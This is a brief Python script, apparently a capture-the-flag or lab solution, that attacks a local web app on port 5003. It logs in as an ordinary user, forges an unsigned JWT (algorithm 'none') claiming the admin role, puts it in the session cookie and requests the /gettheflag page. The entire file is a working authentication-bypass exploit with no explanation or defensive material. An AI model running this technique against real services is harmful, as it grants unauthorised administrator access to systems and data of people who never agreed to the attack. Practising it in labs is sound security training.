import requests
import jwt

target_url = "http://localhost:5003"

session = requests.Session()

login_data = {
    "username": "user",
    "password": "user"
}

session.post(f"{target_url}/login", data=login_data)

original_token = session.cookies.get("token")
print(f"[+] Original Token: {original_token}")

payload = {
    "username": "user",
    "role": "admin"
}

admin_token = jwt.encode(payload, "", algorithm="none")
print(f"[+] Forged Admin Token: {admin_token}")

if "token" in session.cookies:
    del session.cookies["token"]

session.cookies.set("token", admin_token)

response = session.get(f"{target_url}/gettheflag")
flag = response.text
print(f"[+] Flag: {flag}")